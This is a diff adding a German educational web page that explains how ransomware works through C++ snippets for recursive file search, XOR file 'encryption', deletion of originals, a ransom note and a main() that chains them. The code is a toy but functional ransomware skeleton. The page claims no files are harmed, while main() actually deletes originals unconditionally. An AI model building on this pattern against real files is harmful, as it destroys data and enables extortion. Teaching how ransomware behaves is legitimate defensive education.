@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Wie funktioniert Ransomware? – Lernseite</title>
+  <style>
+    body {
+      font-family: system-ui, sans-serif;
+      margin: 0;
+      padding: 2rem;
+      background-color: #f5f5f5;
+      color: #222;
+      line-height: 1.7;
+    }
+    h1, h2 {
+      color: #c0392b;
+    }
+    pre {
+      background-color: #eee;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    code {
+      font-family: monospace;
+    }
+    .note {
+      background-color: #fff3cd;
+      border-left: 5px solid #ffca28;
+      padding: 1rem;
+      margin-bottom: 2rem;
+    }
+    .section {
+      margin-bottom: 3rem;
+    }
+    footer {
+      font-size: 0.9em;
+      color: #777;
+      border-top: 1px solid #ccc;
+      margin-top: 4rem;
+      padding-top: 1rem;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>🧠 Wie funktioniert Ransomware?<br><small>(Lernprojekt mit C++)</small></h1>
+
+  <div class="note">
+    ⚠️ <strong>Wichtig:</strong> Diese Seite ist rein zu Lernzwecken erstellt. Alle C++-Beispiele sind ungefährlich und simulieren nur typische Verhaltensweisen von Ransomware – ohne Dateien zu beschädigen.
+  </div>
+
+  <div class="section">
+    <h2>1. Was ist Ransomware?</h2>
+    <p>
+      Ransomware ist eine Art von Schadsoftware, die Dateien auf einem Computer verschlüsselt und anschließend ein Lösegeld verlangt, um sie wieder freizugeben. Das Ziel ist meist Erpressung – oft in Kryptowährung.
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>2. Schritt für Schritt erklärt (mit C++-Beispielen)</h2>
+  </div>
+
+  <div class="section">
+    <h3>🔍 Dateisuche im Dateisystem</h3>
+    <p>
+      Ransomware durchsucht das Dateisystem nach bestimmten Dateitypen, z. B. <code>.txt</code>, <code>.docx</code> oder <code>.jpg</code>. Dabei wird rekursiv jeder Ordner durchlaufen.
+    </p>
+    <pre><code>std::vector&lt;fs::path&gt; findFiles(const fs::path&amp; directory) {
+    std::vector&lt;fs::path&gt; files;
+    for (const auto&amp; entry : fs::recursive_directory_iterator(directory)) {
+        if (entry.is_regular_file() &amp;&amp; entry.path().extension() == ".txt") {
+            files.push_back(entry.path());
+        }
+    }
+    return files;
+}</code></pre>
+    <p>
+      Diese Funktion speichert alle <code>.txt</code>-Dateien im angegebenen Ordner in einer Liste.
+    </p>
+  </div>
+
+  <div class="section">
+    <h3>🔐 Simulierte Verschlüsselung mit XOR</h3>
+    <p>
+      Statt echter Verschlüsselung (z. B. AES) wird hier eine einfache XOR-Verschlüsselung verwendet, die leicht umkehrbar ist. Diese Methode eignet sich zum Lernen, ist aber in der Praxis unsicher.
+    </p>
+    <pre><code>void xorEncryptDecrypt(const std::string&amp; filePath, char key = 'K') {
+    std::ifstream inFile(filePath, std::ios::binary);
+    std::ofstream outFile(filePath + ".enc", std::ios::binary);
+
+    char c;
+    while (inFile.get(c)) {
+        c ^= key; // einfacher XOR-Schlüssel
+        outFile.put(c);
+    }
+
+    inFile.close();
+    outFile.close();
+}</code></pre>
+    <p>
+      Jeder Buchstabe wird mit dem Schlüssel <code>'K'</code> per XOR verknüpft – dadurch entsteht eine Datei, die ohne den Schlüssel nicht lesbar ist.
+    </p>
+  </div>
+
+  <div class="section">
+    <h3>🗑️ (Simuliertes) Löschen der Originaldatei</h3>
+    <p>
+      In echter Ransomware wird die Originaldatei oft gelöscht, um die Opfer zur Zahlung zu zwingen. Hier wird das Verhalten nur demonstriert:
+    </p>
+    <pre><code>void deleteOriginalFile(const std::string&amp; filePath) {
+    if (fs::exists(filePath)) {
+        fs::remove(filePath);
+    }
+}</code></pre>
+    <p>
+      Diese Funktion löscht die Datei, wenn sie existiert. In der Simulation solltest du sie mit Vorsicht aktivieren.
+    </p>
+  </div>
+
+  <div class="section">
+    <h3>💬 Die "Lösegeld"-Nachricht</h3>
+    <p>
+      Die meisten Ransomware-Varianten hinterlassen eine Textdatei mit einer Nachricht, die zur Zahlung auffordert.
+    </p>
+    <pre><code>void showRansomNote() {
+    std::cout &lt;&lt; "Deine Dateien wurden verschlüsselt!\n";
+    std::cout &lt;&lt; "Sende 0.1 BTC an: FAKE-BTC-ADDRESS\n";
+}</code></pre>
+    <p>
+      Dies ist nur ein Textausdruck – kein echter Schaden, sondern eine Simulation für Schulungszwecke.
+    </p>
+  </div>
+
+  <div class="section">
+    <h3>🧩 Hauptfunktion: Alles zusammenfügen</h3>
+    <p>
+      Die <code>main()</code>-Funktion verbindet alle Teile zu einem einfachen Ablauf:
+    </p>
+    <pre><code>int main() {
+    auto files = findFiles("./testdata");
+
+    for (const auto&amp; file : files) {
+        xorEncryptDecrypt(file.string());
+        deleteOriginalFile(file.string());
+    }
+
+    showRansomNote();
+    return 0;
+}</code></pre>
+    <p>
+      Dateien werden gesucht, "verschlüsselt" und (wenn gewollt) gelöscht – am Ende erscheint eine Warnung.
+    </p>
+  </div>
+
+  <div class="section">
+    <h2>🧠 Was du daraus lernen kannst:</h2>
+    <ul>
+      <li>Wie sich Ransomware typischerweise verhält</li>
+      <li>Warum es wichtig ist, Backups zu machen</li>
+      <li>Wie einfache Verschlüsselungstechniken funktionieren</li>
+      <li>Wie Sicherheitssoftware solche Angriffe erkennen kann</li>
+    </ul>
+  </div>
+
+  <footer>
+    © 2025 – Lernseite zu Ransomware. Kein echter Angriff, keine Daten in Gefahr.<br>
+    Erstellt für Bildungszwecke. Fragen? → Frag ChatGPT 😉
+  </footer>
+
+</body>
+</html>
